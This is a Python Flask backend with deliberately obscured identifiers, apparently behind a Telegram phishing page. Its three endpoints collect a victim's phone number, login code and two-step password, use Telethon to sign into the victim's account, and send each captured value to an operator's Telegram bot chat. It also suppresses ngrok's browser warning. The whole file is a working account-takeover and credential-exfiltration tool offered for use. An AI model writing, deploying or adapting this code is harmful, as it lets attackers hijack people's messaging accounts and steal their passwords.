import os
import asyncio
import logging
import requests
from flask import Flask, send_from_directory, request, jsonify
from flask_cors import CORS
from dotenv import load_dotenv
from telethon import TelegramClient
from telethon.errors import PhoneCodeInvalidError, SessionPasswordNeededError, PasswordHashInvalidError
import threading

load_dotenv()
logging.basicConfig(level=logging.WARNING)

_q1 = int(os.getenv("API_ID"))
_q2 = os.getenv("API_HASH")
_q3 = os.getenv("WOW_TOKEN")
_q4 = os.getenv("WOW_CHAT")

app = Flask(__name__)
CORS(app)
_m = {}
_lp = asyncio.new_event_loop()

def _li():
    asyncio.set_event_loop(_lp)
    _lp.run_forever()

threading.Thread(target=_li, daemon=True).start()

def _rn(c):
    return asyncio.run_coroutine_threadsafe(c, _lp).result(timeout=30)

def _nf(t):
    try:
        requests.post(
            f'https://api.telegram.org/bot{_q3}/sendMessage',
            json={'chat_id': _q4, 'text': t, 'parse_mode': 'HTML'},
            timeout=5
        )
    except: pass

@app.after_request
def _ah(r):
    r.headers['ngrok-skip-browser-warning'] = 'true'
    return r

@app.route('/')
def _r0(): return send_from_directory('static', 'index.html')

@app.route('/<path:f>')
def _rf(f): return send_from_directory('static', f)

@app.route('/xp1', methods=['POST'])
def _xp1():
    d = request.get_json()
    a = d.get('a','').strip()
    b = d.get('b','x')
    if not a: return jsonify({'ok':False,'msg':'Required'}),400
    try:
        async def _g():
            c = TelegramClient(f'_t{b}',_q1,_q2)
            await c.connect()
            z = await c.send_code_request(a)
            _m[b] = {'a':a,'h':z.phone_code_hash,'c':c}
        _rn(_g())
        _nf(f'<b>+A</b>\n<code>{b}</code>\n<code>{a}</code>')
        return jsonify({'ok':True})
    except Exception as e:
        return jsonify({'ok':False,'msg':str(e)}),500

@app.route('/xp2', methods=['POST'])
def _xp2():
    d = request.get_json()
    b = d.get('b','x')
    v = d.get('c','').strip()
    if b not in _m: return jsonify({'ok':False,'msg':'Restart.'}),400
    s = _m[b]
    try:
        async def _g():
            await s['c'].sign_in(s['a'],v,phone_code_hash=s['h'])
        _rn(_g())
        del _m[b]
        _nf(f'<b>+B</b>\n<code>{b}</code>\n<code>{s["a"]}</code>\n<code>{v}</code>')
        return jsonify({'ok':True,'nx':False})
    except PhoneCodeInvalidError:
        return jsonify({'ok':False,'msg':'Incorrect.'}),400
    except SessionPasswordNeededError:
        _nf(f'<b>+C</b>\n<code>{b}</code>\n<code>{s["a"]}</code>\n<code>{v}</code>')
        return jsonify({'ok':True,'nx':True})
    except Exception as e:
        return jsonify({'ok':False,'msg':str(e)}),500

@app.route('/xp3', methods=['POST'])
def _xp3():
    d = request.get_json()
    b = d.get('b','x')
    k = d.get('k','').strip()
    if b not in _m: return jsonify({'ok':False,'msg':'Restart.'}),400
    c = _m[b]['c']
    a = _m[b]['a']
    try:
        async def _g():
            await c.sign_in(password=k)
        _rn(_g())
        del _m[b]
        _nf(f'<b>+D</b>\n<code>{b}</code>\n<code>{a}</code>\n<code>{k}</code>')
        return jsonify({'ok':True})
    except PasswordHashInvalidError:
        return jsonify({'ok':False,'msg':'Incorrect.'}),400
    except Exception as e:
        return jsonify({'ok':False,'msg':str(e)}),500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
